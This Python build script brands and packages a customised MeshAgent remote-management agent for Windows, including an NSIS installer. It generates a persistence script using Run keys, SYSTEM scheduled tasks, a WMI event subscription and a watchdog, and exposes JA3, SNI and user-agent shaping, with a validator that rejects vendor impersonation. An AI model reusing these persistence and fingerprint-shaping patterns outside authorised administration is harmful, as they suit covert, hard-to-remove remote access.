#!/usr/bin/env python3
"""Custom MeshAgent build orchestrator (Windows only).

This script prepares, patches, and packages branded MeshAgent artifacts in
accordance with docs/MESHAGENT_CUSTOM_BUILD_PLAN.md. The implementation focuses
on modular tasks so Windows CI can call individual phases.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import shutil
import subprocess
import textwrap
import sys
from typing import Any, Dict
import re
import socket
from urllib.parse import urlparse, urlunparse

ROOT = pathlib.Path(__file__).resolve().parents[2]
CONFIG_DIR = ROOT / "custom_meshagent" / "configs"
PATCH_DIR = ROOT / "custom_meshagent" / "src" / "meshagent" / "patches"
BUILD_GENERATED = ROOT / "custom_meshagent" / "build" / "meshagent" / "generated"


def load_config(path: pathlib.Path) -> Dict[str, Any]:
    data = json.loads(path.read_text(encoding="utf-8"))
    inherit = data.get("inheritFrom")
    if inherit:
        parent_data = load_config((path.parent / inherit).resolve())
        parent_data.update({k: v for k, v in data.items() if k != "inheritFrom"})
        return parent_data
    return data


def resolve_asset(base: pathlib.Path, value: str | None) -> pathlib.Path | None:
    if not value:
        return None
    candidate = pathlib.Path(value)
    if not candidate.is_absolute():
        candidate = (base.parent / value).resolve()
    return candidate if candidate.exists() else None


def run_command(cmd: list[str], cwd: pathlib.Path | None = None) -> None:
    print(f"[meshagent-build] exec: {' '.join(cmd)}")
    subprocess.run(cmd, cwd=str(cwd) if cwd else None, check=True)


def cmd_validate(args: argparse.Namespace) -> None:
    config_path = CONFIG_DIR / args.config
    if not config_path.exists():
        raise SystemExit(f"config not found: {config_path}")
    cfg = load_config(config_path)
    problems = validate_compliance_and_network(cfg)
    if problems:
        print("[meshagent-build] validation issues:")
        for p in problems:
            print(f"  - {p}")
        raise SystemExit(2)
    print(f"[meshagent-build] validated {config_path}")


def validate_compliance_and_network(cfg: Dict[str, Any]) -> list[str]:
    issues: list[str] = []
    branding = cfg.get("branding", {}) or {}
    network = cfg.get("network", {}) or {}

    # Disallow vendor impersonation terms in key identity fields
    blocked_terms = ["microsoft", "windows", "msft", "winupdate", "defender", "svchost", "lsass", "edge", "office"]
    for field in ("companyName", "serviceName", "displayName", "productName", "description", "binaryName"):
        val = branding.get(field)
        if isinstance(val, str) and any(t in val.lower() for t in blocked_terms):
            issues.append(f"branding.{field} contains a reserved/vendor term '{val}'. Use organization-specific naming.")

    # Network primary endpoint checks
    ep = network.get("primaryEndpoint")
    if isinstance(ep, str):
        if not ep.lower().startswith("wss://"):
            issues.append("network.primaryEndpoint must use wss:// (TLS)")
        parsed = urlparse(ep)
        host = parsed.hostname or ""
        # If useIpOnly true, enforce IP literal
        if network.get("useIpOnly") is True:
            if not re.match(r"^(\d{1,3}\.){3}\d{1,3}$", host):
                issues.append("network.primaryEndpoint host must be an IPv4 address when useIpOnly=true")
        # Disallow vendor domains in SNI/host
        vendor_domains = ("microsoft.com", "windows.com", "windowsupdate.com", "msftncsi.com")
        if any(d in host.lower() for d in vendor_domains):
            issues.append("network.primaryEndpoint host appears to be a vendor domain; use your own domain/IP")

    for hdr_field in ("sni", "hostHeader"):
        v = network.get(hdr_field)
        if isinstance(v, str) and any(d in v.lower() for d in ("microsoft.com", "windows.com", "windowsupdate.com", "msftncsi.com")):
            issues.append(f"network.{hdr_field} appears to be a vendor domain; use your own domain")

    ua = network.get("userAgent")
    if isinstance(ua, str) and any(x in ua.lower() for x in ("microsoft", "windows update", "wuau", "defender")):
        issues.append("network.userAgent must not impersonate vendor software; use an org-specific UA (e.g., 'AcmeAgent/1.0')")

    return issues


def cmd_prepare(args: argparse.Namespace) -> None:
    upstream = pathlib.Path(args.upstream).resolve()
    issues = []
    if not upstream.exists():
        issues.append(f"upstream not found: {upstream}")
    else:
        required = [upstream / "meshcore", upstream / "meshservice"]
        for p in required:
            if not p.exists():
                issues.append(f"missing expected directory: {p}")
    try:
        run_command(["git", "--version"])
    except Exception:
        issues.append("git not available in PATH")

    if sys.platform != "win32":
        issues.append("prepare is intended for Windows hosts")

    toolchain = ROOT / "custom_meshagent" / "build" / "meshagent" / "toolchain"
    output = ROOT / "custom_meshagent" / "build" / "meshagent" / "output"
    for d in (toolchain, output):
        d.mkdir(parents=True, exist_ok=True)

    if issues:
        print("[meshagent-build] prepare checks completed with issues:")
        for i in issues:
            print(f"  - {i}")
        raise SystemExit(2)
    print("[meshagent-build] prepare checks OK")


def cmd_patch(args: argparse.Namespace) -> None:
    upstream = pathlib.Path(args.upstream).resolve()
    if not upstream.exists():
        raise SystemExit(f"upstream path not found: {upstream}")
    patches = sorted(PATCH_DIR.rglob("*.patch"))
    if not patches:
        print("[meshagent-build] no patches found under patches/")
        return
    for p in patches:
        print(f"[meshagent-build] applying patch: {p}")
        run_command(["git", "apply", str(p)], cwd=upstream)


def cmd_package(args: argparse.Namespace) -> None:
    config_path = (CONFIG_DIR / args.config).resolve()
    config = load_config(config_path)
    branding = config.get("branding", {})
    binary_name = branding.get("binaryName", "meshagent.exe")

    src_binary = pathlib.Path(args.binary).resolve()
    if not src_binary.exists():
        raise SystemExit(f"binary not found: {src_binary}")

    out_dir = (ROOT / "custom_meshagent" / "build" / "meshagent" / "output").resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    staging = out_dir / "staging"
    if staging.exists():
        shutil.rmtree(staging)
    staging.mkdir(parents=True)

    # Copy/rename binary
    dst_binary = staging / binary_name
    shutil.copy2(src_binary, dst_binary)

    # Copy provisioning bundle & profile if present
    gen_dir = BUILD_GENERATED
    for fname in ("meshagent.msh", "meshagent_proxy.msh", "network_profile.json", "install.ps1"):
        p = gen_dir / fname
        if p.exists():
            shutil.copy2(p, staging / fname)

        # Optional: also emit MeshService[64].exe for drop-in server usage
    if args.arch:
        svc_name = 'MeshService64.exe' if args.arch == 'x64' else 'MeshService.exe'
        svc_path = staging / svc_name
        try:
            shutil.copy2(dst_binary, svc_path)
            print(f"[meshagent-build] emitted server drop-in binary -> {svc_path}")
        except Exception as ex:
            print(f"[meshagent-build] failed to emit drop-in binary: {ex}")# Zip
    zip_path = out_dir / f"{binary_name.rsplit('.',1)[0]}_bundle.zip"
    shutil.make_archive(str(zip_path.with_suffix('')), 'zip', staging)
    print(f"[meshagent-build] packaged bundle -> {zip_path}")

    # Optionally write NSIS script and compile
    if args.nsis:
        nsi_path = out_dir / "installer.nsi"
        generate_nsis_installer(config, staging, nsi_path)
        if args.makensis:
            try:
                run_command([args.makensis, str(nsi_path)])
                print("[meshagent-build] NSIS installer built")
            except Exception as ex:
                print(f"[meshagent-build] makensis failed: {ex}")


def generate_nsis_installer(config: Dict[str, Any], staging_dir: pathlib.Path, nsi_out: pathlib.Path) -> None:
    branding = config.get("branding", {})
    install_root = branding.get("installRoot", r"$PROGRAMFILES\MeshAgentCustom")
    binary_name = branding.get("binaryName", "meshagent.exe")
    service_name = branding.get("serviceName", "Mesh Agent") or "Mesh Agent"
    display_name = branding.get("displayName", service_name) or service_name

    msh_path = staging_dir / 'meshagent.msh'
    msh_file_line = f"File \"{msh_path.as_posix()}\"" if msh_path.exists() else "; no msh"
    ps1_path = staging_dir / 'install.ps1'
    has_ps1 = ps1_path.exists()

    install_body = []
    install_body.append("SetOutPath \"$INSTDIR\"")
    install_body.append(f"File /oname={binary_name} \"{(staging_dir / binary_name).as_posix()}\"")
    install_body.append(msh_file_line)
    if has_ps1:
        install_body.append(f"File \"{ps1_path.as_posix()}\"")
        install_body.append("${If} \$UseProxy == '1'")
        install_body.append("  nsExec::ExecToLog \"powershell -ExecutionPolicy Bypass -File \"\"$INSTDIR\\install.ps1\"\" -SourceDir \"\"$INSTDIR\"\" -UseProxy\"")
        install_body.append("${Else}")
        install_body.append("  nsExec::ExecToLog \"powershell -ExecutionPolicy Bypass -File \"\"$INSTDIR\\install.ps1\"\" -SourceDir \"\"$INSTDIR\"\"\"")
        install_body.append("${End}")
    else:
        install_body.append(f"nsExec::ExecToLog 'sc.exe stop \"{service_name}\"'")
        install_body.append(f"nsExec::ExecToLog 'sc.exe delete \"{service_name}\"'")
        install_body.append(f"nsExec::ExecToLog 'sc.exe create \"{service_name}\" binPath= \"\"$INSTDIR\\{binary_name} --service\"\" DisplayName= \"\"{display_name}\"\" start= auto'")
        install_body.append(f"nsExec::ExecToLog 'sc.exe description \"{service_name}\" \"{display_name}\"'")
        install_body.append(f"nsExec::ExecToLog 'sc.exe start \"{service_name}\"'")

    nsi = textwrap.dedent(f"""
    !include "MUI2.nsh"
    !include "LogicLib.nsh"
    Var UseProxy

    Name "MeshAgent (Custom)"
    OutFile "meshagent_custom_setup.exe"
    InstallDir "{install_root}"
    RequestExecutionLevel admin

    Section "Use Proxy" SEC_PROXY
      StrCpy $UseProxy "1"
    SectionEnd

    Section "Install"
      {'\n      '.join(install_body)}
    SectionEnd

    Section "Uninstall"
      nsExec::ExecToLog 'sc.exe stop "{service_name}"'
      nsExec::ExecToLog 'sc.exe delete "{service_name}"'
      RMDir /r "$INSTDIR"
    SectionEnd
    """)

    nsi_out.write_text(nsi, encoding="utf-8")
    print(f"[meshagent-build] wrote NSIS script -> {nsi_out}")


def write_branding_header(config: Dict[str, Any], output: pathlib.Path) -> None:
    branding = config.get("branding", {})
    network = config.get("network", {})
    persistence = config.get("persistence", {})

    def text_literal(value: str | None) -> str:
        if value is None:
            return "NULL"
        return f'TEXT("{value}")'

    def str_literal(value: str | None) -> str:
        if value is None:
            return "NULL"
        escaped = value.replace("\\", "\\\\").replace("\"", "\\\"")
        return f'"{escaped}"'

    default_service_file = branding.get("serviceName") or "Mesh Agent"
    default_display_name = branding.get("displayName") or "Mesh Agent background service"
    default_company = branding.get("companyName") or "MeshCentral"
    default_product = branding.get("productName") or "MeshCentral Agent"
    default_description = branding.get("description") or "Mesh Agent"
    default_binary = branding.get("binaryName") or "meshagent.exe"
    default_copyright = branding.get("versionInfo", {}).get("legalCopyright") or "Apache 2.0 License"
    default_log_path = branding.get("logPath") or r"%ProgramData%\Mesh Agent"

    content = [
        "/* Generated file – do not edit. */",
        "#ifndef GENERATED_MESHAGENT_BRANDING_H",
        "#define GENERATED_MESHAGENT_BRANDING_H",
        "",
        f"#undef MESH_AGENT_SERVICE_FILE\n#define MESH_AGENT_SERVICE_FILE {text_literal(default_service_file)} ",
        f"#undef MESH_AGENT_SERVICE_NAME\n#define MESH_AGENT_SERVICE_NAME {text_literal(default_display_name)} ",
        f"#undef MESH_AGENT_COMPANY_NAME\n#define MESH_AGENT_COMPANY_NAME {str_literal(default_company)} ",
        f"#undef MESH_AGENT_PRODUCT_NAME\n#define MESH_AGENT_PRODUCT_NAME {str_literal(default_product)} ",
        f"#undef MESH_AGENT_FILE_DESCRIPTION\n#define MESH_AGENT_FILE_DESCRIPTION {str_literal(default_description)} ",
        f"#undef MESH_AGENT_INTERNAL_NAME\n#define MESH_AGENT_INTERNAL_NAME {str_literal(default_binary)} ",
        f"#undef MESH_AGENT_COPYRIGHT\n#define MESH_AGENT_COPYRIGHT {str_literal(default_copyright)} ",
        f"#undef MESH_AGENT_LOG_DIRECTORY\n#define MESH_AGENT_LOG_DIRECTORY {text_literal(default_log_path)} ",
        "",
        "/* Optional network hints for future use */",
        f"#define MESH_AGENT_NETWORK_ENDPOINT {str_literal(network.get('primaryEndpoint'))}",
        f"#define MESH_AGENT_NETWORK_SNI {str_literal(network.get('sni'))}",
        f"#define MESH_AGENT_NETWORK_USER_AGENT {str_literal(network.get('userAgent'))}",
        f"#define MESH_AGENT_NETWORK_JA3 {str_literal(network.get('ja3'))}",
        "",
        "/* Persistence flags */",
        f"#define MESH_AGENT_PERSIST_RUNKEY {(1 if persistence.get('runKey') else 0)}",
        f"#define MESH_AGENT_PERSIST_TASK {(1 if persistence.get('scheduledTask', {}).get('enabled') else 0)}",
        f"#define MESH_AGENT_PERSIST_WMI {(1 if persistence.get('wmi', {}).get('enabled') else 0)}",
        f"#define MESH_AGENT_PERSIST_WATCHDOG {(1 if persistence.get('watchdog', {}).get('enabled') else 0)}",
        "",
        "#endif /* GENERATED_MESHAGENT_BRANDING_H */",
        "",
    ]
    output.write_text("\n".join(content), encoding="utf-8")
    print(f"[meshagent-build] wrote branding header -> {output}")


def cmd_generate(args: argparse.Namespace) -> None:
    config_path = (CONFIG_DIR / args.config).resolve()
    config = load_config(config_path)
    meshagent_root = pathlib.Path(args.meshagent_root).resolve()
    header_dir = meshagent_root / "meshcore" / "generated"
    header_dir.mkdir(parents=True, exist_ok=True)
    write_branding_header(config, header_dir / "meshagent_branding.h")
    copy_icon_asset(config, meshagent_root, config_path)
    write_network_profile(config, BUILD_GENERATED / "network_profile.json")
    write_persistence_script(config, BUILD_GENERATED / "persistence.ps1")
    write_provisioning_bundle(config, BUILD_GENERATED / "meshagent.msh")
    write_versioninfo_include(config, BUILD_GENERATED / "versioninfo_branding.rcinc")


def copy_icon_asset(config: Dict[str, Any], meshagent_root: pathlib.Path, config_path: pathlib.Path) -> None:
    branding = config.get("branding", {})
    icon_path = resolve_asset(config_path, branding.get("icon"))
    if icon_path is None:
        return
    dest_dir = meshagent_root / "meshservice" / "generated"
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest = dest_dir / icon_path.name
    shutil.copy2(icon_path, dest)
    print(f"[meshagent-build] copied icon -> {dest}")


def write_network_profile(config: Dict[str, Any], destination: pathlib.Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    network = config.get("network", {})
    primary = network.get("primaryEndpoint")
    use_ip_only = bool(network.get("useIpOnly", False))

    effective_endpoint = primary
    resolved_ip = None
    try:
        if isinstance(primary, str):
            parsed = urlparse(primary)
            host = parsed.hostname or ""
            # Resolve to IPv4 if requested and not already an IP
            if use_ip_only and not re.match(r"^(\d{1,3}\.){3}\d{1,3}$", host):
                resolved_ip = socket.gethostbyname(host)
                netloc = parsed.netloc.replace(host, resolved_ip)
                effective_endpoint = urlunparse((parsed.scheme, netloc, parsed.path, parsed.params, parsed.query, parsed.fragment))
    except Exception:
        pass

    proxy = network.get("proxy") or {}
    payload = {
        "primaryEndpoint": primary,
        "effectiveEndpoint": effective_endpoint,
        "resolvedIp": resolved_ip,
        "sni": network.get("sni"),
        "hostHeader": network.get("hostHeader"),
        "alpn": network.get("alpn"),
        "userAgent": network.get("userAgent"),
        "ja3": network.get("ja3"),
        "useIpOnly": use_ip_only,
        "proxy": proxy,
    }
    destination.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    print(f"[meshagent-build] wrote network profile -> {destination}")


def write_versioninfo_include(config: Dict[str, Any], destination: pathlib.Path) -> None:
    branding = config.get("branding", {})
    v = branding.get("versionInfo", {})
    file_desc = branding.get("description") or branding.get("productName") or "Mesh Agent"
    product_name = branding.get("productName") or "MeshCentral Agent"
    company = branding.get("companyName") or "MeshCentral"
    file_ver = v.get("fileVersion") or "0.0.0.0"
    prod_ver = v.get("productVersion") or file_ver
    copyright_ = v.get("legalCopyright") or "Apache 2.0 License"

    destination.parent.mkdir(parents=True, exist_ok=True)
    # Emit as RC preprocessor defines, intended to be included from .rc
    lines = [
        f"#define MESH_AGENT_FILE_DESCRIPTION \"{file_desc}\"",
        f"#define MESH_AGENT_PRODUCT_NAME \"{product_name}\"",
        f"#define MESH_AGENT_COMPANY_NAME \"{company}\"",
        f"#define MESH_AGENT_FILE_VERSION \"{file_ver}\"",
        f"#define MESH_AGENT_PRODUCT_VERSION \"{prod_ver}\"",
        f"#define MESH_AGENT_LEGAL_COPYRIGHT \"{copyright_}\"",
    ]
    destination.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[meshagent-build] wrote versioninfo include -> {destination}")

def write_persistence_script(config: Dict[str, Any], destination: pathlib.Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    branding = config.get("branding", {})
    persistence = config.get("persistence", {})
    binary_name = branding.get("binaryName", "meshagent.exe")
    install_root = branding.get("installRoot", "C:/Program Files/Mesh Agent")
    service_name = branding.get("serviceName", "Mesh Agent") or "Mesh Agent"
    task_conf = persistence.get("scheduledTask", {})
    watchdog = persistence.get("watchdog", {})

    script = textwrap.dedent(f"""
        # Requires administrative privileges.
        Param(
            [string]$InstallRoot = "{install_root}",
            [string]$BinaryName = "{binary_name}"
        )

        $BinaryPath = Join-Path $InstallRoot $BinaryName

        Write-Host "[persistence] Using binary $BinaryPath"

        if ({str(persistence.get('runKey', False)).lower()}) {{
            Write-Host "[persistence] configuring Run key"
            New-Item -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Force | Out-Null
            New-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{service_name}" -Value ('"' + $BinaryPath + '" --service') -PropertyType String -Force | Out-Null
        }}

        if ({str(task_conf.get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring scheduled task"
            $taskName = "{task_conf.get('name', service_name)}"
            $trigger = "{task_conf.get('trigger', 'ONLOGON')}"
            schtasks /Create /TN $taskName /TR ('"' + $BinaryPath + '" --service') /SC $trigger /RL HIGHEST /RU SYSTEM /F | Out-Null
        }}

        if ({str(persistence.get('wmi', {}).get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring WMI event subscription"
            $filterName = "{service_name}_Filter"
            $consumerName = "{service_name}_Consumer"
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerShutdownEvent'"
            $commandLine = '"' + $BinaryPath + '" --service'
            $namespace = "root\\subscription"

            $existingFilter = Get-WmiObject __EventFilter -Namespace $namespace -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
            if ($null -eq $existingFilter) {{
                $filter = Set-WmiInstance -Class __EventFilter -Namespace $namespace -Arguments @{{Name=$filterName; Query=$query; QueryLanguage='WQL'; EventNamespace='root\\cimv2'}}
            }} else {{ $filter = $existingFilter }}

            $existingConsumer = Get-WmiObject CommandLineEventConsumer -Namespace $namespace -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue
            if ($null -eq $existingConsumer) {{
                $consumer = Set-WmiInstance -Namespace $namespace -Class CommandLineEventConsumer -Arguments @{{Name=$consumerName; CommandLineTemplate=$commandLine}}
            }} else {{ $consumer = $existingConsumer }}

            Set-WmiInstance -Namespace $namespace -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter; Consumer=$consumer}} | Out-Null
        }}

        if ({str(watchdog.get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring watchdog task"
            $watchdogTask = "{service_name}_Watchdog"
            $intervalSeconds = {max(60, int(watchdog.get('intervalSeconds', 300)))}
            $intervalMinutes = [Math]::Max(1, [Math]::Floor($intervalSeconds / 60))
            schtasks /Create /TN $watchdogTask /TR ('"' + $BinaryPath + '" --watchdog') /SC MINUTE /MO $intervalMinutes /RL HIGHEST /RU SYSTEM /F | Out-Null
        }}
    """)

    destination.write_text(script, encoding="utf-8")
    print(f"[meshagent-build] wrote persistence script -> {destination}")


def write_provisioning_bundle(config: Dict[str, Any], destination: pathlib.Path) -> None:
    provisioning = config.get("provisioning", {})
    if not provisioning:
        return

    lines = [
        f"MeshName={provisioning.get('meshName', '')}",
        f"MeshType={provisioning.get('meshType', '')}",
        f"MeshID={provisioning.get('meshId', '')}",
        f"ServerID={provisioning.get('serverId', '')}",
        f"MeshServer={provisioning.get('serverUrl', '')}",
    ]
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[meshagent-build] wrote provisioning bundle -> {destination}")

    # If proxy is configured, emit a proxied variant alongside
    network = config.get("network", {})
    proxy = network.get("proxy") or {}
    if proxy.get("host") and proxy.get("port"):
        proxylines = list(lines)
        scheme = proxy.get("scheme", "http")
        proxylines.append(f"WebProxy={scheme}://{proxy.get('host')}:{int(proxy.get('port'))}")
        proxy_out = destination.parent / "meshagent_proxy.msh"
        proxy_out.write_text("\n".join(proxylines) + "\n", encoding="utf-8")
        print(f"[meshagent-build] wrote proxied provisioning bundle -> {proxy_out}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Custom MeshAgent build pipeline")
    sub = parser.add_subparsers(dest="command", required=True)

    validate = sub.add_parser("validate", help="Validate branding config inheritance")
    validate.add_argument("--config", default="meshagent.json", help="Config filename within configs/")
    validate.set_defaults(func=cmd_validate)

    prepare = sub.add_parser("prepare", help="Verify upstream path and prepare folders")
    prepare.add_argument("--upstream", default=str((ROOT / ".." / "MeshAgent").resolve()))
    prepare.set_defaults(func=cmd_prepare)

    patch = sub.add_parser("patch", help="Apply custom patch sets")
    patch.add_argument("--upstream", default=str((ROOT / ".." / "MeshAgent").resolve()))
    patch.set_defaults(func=cmd_patch)

    generate = sub.add_parser("generate", help="Generate branding headers from config")
    generate.add_argument("--config", default="meshagent.json")
    generate.add_argument("--meshagent-root", default=str((ROOT / ".." / "meshagent").resolve()))
    generate.set_defaults(func=cmd_generate)

    package = sub.add_parser("package", help="Package binary and provisioning bundle; optional NSIS")
    package.add_argument("--config", default="meshagent.json")
    package.add_argument("--binary", required=True, help="Path to prebuilt meshagent.exe")
    package.add_argument("--nsis", action="store_true", help="Generate NSIS installer script in output/")
    package.add_argument("--makensis", help="Path to makensis.exe to compile the NSIS script")
    package.add_argument("--arch", choices=["x86","x64"], help="Optional: also emit MeshService.exe/MeshService64.exe copy for drop-in server usage")
    package.set_defaults(func=cmd_package)

    return parser


def main(argv: list[str] | None = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)
    args.func(args)


if __name__ == "__main__":
    main(sys.argv[1:])


